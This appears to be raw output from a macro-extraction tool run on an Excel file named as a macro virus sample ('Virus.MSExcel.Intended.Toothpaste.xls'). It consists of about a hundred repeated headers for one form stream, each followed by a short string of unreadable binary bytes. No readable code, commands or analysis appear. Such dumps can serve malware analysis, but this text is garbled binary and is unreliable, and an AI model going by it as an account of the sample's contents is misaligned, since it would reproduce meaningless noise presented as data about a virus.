-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
97��2|p{�&?�����2O�\o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���~�?����~q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!@"APq��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6+�x֝
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~#)SG]v�&^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�R�n��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
uQ�O0瓭�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ⱘ���fdfG��2�k2�S�#|A�woH�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�~��G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Bp�I�z}�'c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�J���m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�C��+5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5(��/\����:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|,C�tt"���C����~<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G̼؄?�!�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̱K۞Y�ȩ�,�����n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?B�����yx~�',��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"AQa2q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#0@R�B�3bP����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��"J��G�֒����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��(n�5r�4���6�cD*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����L[:�4�Ȍ10$��q�Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�̈́��_/b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�y%<�0�N�abD�Da�L.f
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�с�]8�C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���a2�.-l��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�谻~��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W��4V�2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,<v೘E=�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��XDڇ����9�hE���O�nb,��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Eb�/���8v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v�o�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�`wUV�Ω�U3�a~�й���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O��h7O|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`���Y�%Q���u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?�.&4��X��'&b=��R��0da
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�z&�X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>�,R�:�'��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ä�~[G�#�B�0�hi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@�\7b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����' �<�����X�U8�]S6F�D��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�Lq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8�̢*4�C�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
swU1��a��A�el��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��G�B�;�S6�S����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����wP�;�IU��a�kv��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���+��u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

��dփ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��T^!`��XvMb�3t|d +ܭ���

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J����3
2��	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-�u}��!AM&ҦD'~*��a6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q��7�S��f�AU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D�I\���EJUa�&��*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��OT[�&�vWE�4g9_/u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z�����h�4@*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�t�J���� ��\���i��f�S�D���"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��p��E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h�;�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�Bs_�T7d����U�p)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�JS�A�{*^j
ҩ�xN�!4�U��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xGKJ�>a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���w�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��h��R�Ժ��Krq�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vMk;��0!R�2�8�v=��r#I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�RWU\[&����s�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R��<*�%rI�
z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�o�gC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V�岅[���:�m�;
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
vv(86
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�K�0-!Tsu;���t\�@09C�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��sQodT���3���^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�rL�m��;d�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 T!���F�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(r��K=Gr�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>�7\�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jr�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

2j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{(�ǙY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a̞�R�&��v�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ծ4���9Y_+�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0g#Wk-�)����E�V|�*=Es�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+�T�X���a�\�m���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�!n����#+'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v[����T���dD��2��v;*���2o�:y��O0#7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�hwR�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������ΥS7NƠ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��S��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����MM�Pr�uvRW*����+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��ă	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�N����c�ղcN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.u���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�ӡo��y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a|�����{}�M��m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a���C��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V�b�]lt�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ا<��U6Q(�u\�Tl�ʥ�M�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-�5O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�A����R��8ϲ�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o��(�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��7�+.w�����!GmVC�eG]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<�#)6P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�ɷQ9m}u����DƗ&�Ͳ�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�wN*r�\�=��6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
):
s�"ދ���o�Jk��T�4X����Q��"�9�e;��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a q���0P�����
-------------------------------------------------------------------------------
